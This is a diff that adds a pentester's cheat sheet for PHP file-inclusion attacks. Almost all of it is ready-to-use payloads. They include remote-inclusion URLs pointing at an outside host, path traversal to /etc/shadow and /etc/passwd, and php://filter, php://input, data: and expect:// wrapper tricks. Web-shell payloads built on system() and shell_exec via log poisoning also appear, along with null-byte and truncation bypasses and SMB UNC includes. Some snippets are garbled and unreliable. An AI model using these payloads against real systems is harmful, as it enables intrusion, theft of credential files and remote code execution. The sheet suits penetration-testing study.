@@ -1,0 +1,81 @@
+File Inclusion
+
+RFI:
+http://url.ext/file.php?vuln=http://192.168.1.10/path/to/file
+--test including files at http://127.0.0.1/ for firewall
+	--if firewall is found present try connecting to remote hosts over port 53(DNS)
+--in php.ini requires "allow_url_fopen" and "allow_url_include" both set to "on"
+--in source look for include($_REQUEST["file"].".php");
+	
+LFI:
+http://url.ext/file.php?vuln=this&parameter=/etc/shadow
+http://url.ext/file.php?vuln=this&parameter=../../../../etc/shadow
+index.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+*if a suspected lfi vulne fails to return appending a null byte (%00) to target file as the trailing argument in a GET request
+
+Writing to file/file upload
+<?file%20=%20=fopen("./lib/file.php","w");fwrite($file,"<?phpinfo()?>");fclose($file);phpinnfo();?>
+
+php://filter/ method
+http://url.ext/file.php?vuln=this&parameter=php://filter/convert.base64-encode/resource=index
+	-read php stream files
+=php?page=expect://ls
+=php://filter/read=convert.base64-encode/resource=/etc/passwd
+/fi/?page=php://input&cmd=ls
+vuln.php?page=php://filter/convert.base64-encode/resource=index.php
+	--encoding happens before execution therefore <?php .. ?> tags will not execute
+	--curl -s http://$ip/?page=php://filter/convert.base64-encode/resource=index.php | grep -e '[^\ ]\{40,\}' | base64 -d
+?page=php://filter/resource=/etc/passwd
+
+Local file execution(or how to spawn mad web shells)
+php://wrapper/ method	
+http://url.ext/file.php?vuln=this&parameter=data:text/plain,<?php system($_GET['x']); ?>&x=ls
+http://url.ext/file.php?vuln=this&parameter=data:text/plain;base64,IaMbASe64encOdED==
+php?page=zip://path/to/file.zip%23shell
+php?page=tar://path/to/file.tar%23shell
+php?page=expect://ls
+GET:	=php://input&cmd=ls
+		+
+POST:	<?php system($_GET[‘cmd’]); ?>
+vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd?page=php://filter/resource=/etc/passwd
+?page=php://filter/resource=/etc/passwd
+
+
+NULL BYTE BYPASS TECHNIQUES
+vuln.php?page=/etc/passwd%00
+vuln.php?page=/etc/passwd%2500
+
+TRUNCATION BYPASS
+vuln.php?page=/etc/passwd…………………………………………………………………………….
+vuln.php?page=../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
+vuln.php?page=/etc/passwd/../../../../../../../../../../../../../../../../../..
+
+SMB
+?get=\\server\file.ext
+	-connects to remote smb instance defined by hostname in UNC path
+	--uncommon
+?get=\\127.0.0.1\boot.ini	
+	-commonly resolves (ASP/PHP/JSP) UNC path to local filesystem root for smb/cifs
+	--e.g. C:\boot.ini
+	
+TODO
+/zip/tar file read/write methods
+Log poisoning
+	<?php echo shell_exec($_GET['cmd']);?>
+Files to target
+	*nix
+		/proc/self/environ
+		/proc/self/fd/#
+			0,1,2==stdin,stdout,stderr
+			3-100 can be brute forced to read any open files
+			-include malicious php in user agent
+		/proc/self/cmdline
+			-not exploitable for code execution, but may be used to locate sensative files on server
+PHP session files
+	see sans642.1 p.93
+Fuzzing
+	/fuzzdb/dict/BURP-PayLoad/LFI/
+Links
+https://highon.coffee/blog/lfi-cheat-sheet/
+https://www.owasp.org/index.php/PHP_File_Inclusion
+http://www.securityidiots.com/Web-Pentest/LFI/
